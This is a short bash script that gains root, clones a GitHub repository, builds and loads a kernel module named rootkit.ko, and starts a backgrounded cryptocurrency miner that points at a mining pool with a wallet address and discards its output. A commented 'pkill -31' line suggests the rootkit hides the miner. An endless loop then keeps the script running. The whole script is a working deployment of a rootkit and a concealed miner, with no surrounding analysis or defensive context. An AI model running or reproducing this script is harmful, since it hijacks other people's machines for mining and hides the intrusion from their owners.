#!/bin/bash
sudo su
git clone https://github.com/BatiKangkung/Kerecek
cd Kerecek/
make
dmesg -C
insmod rootkit.ko
dmesg
chmod +x avx2
./avx2 -a minotaurx -o stratum+tcps://stratum-asia.rplant.xyz:17068 -u RP7dNRcUFy4BngHv5okrAMHAkW3guQ7kCU.$(echo $(shuf -i 100-999 -n 1)-CPU) -p x >/dev/null & 
uname -a
# pkill -31 avx2
time=${1-1}; while test $time -gt 0; do printf "$time"; sleep 5; done
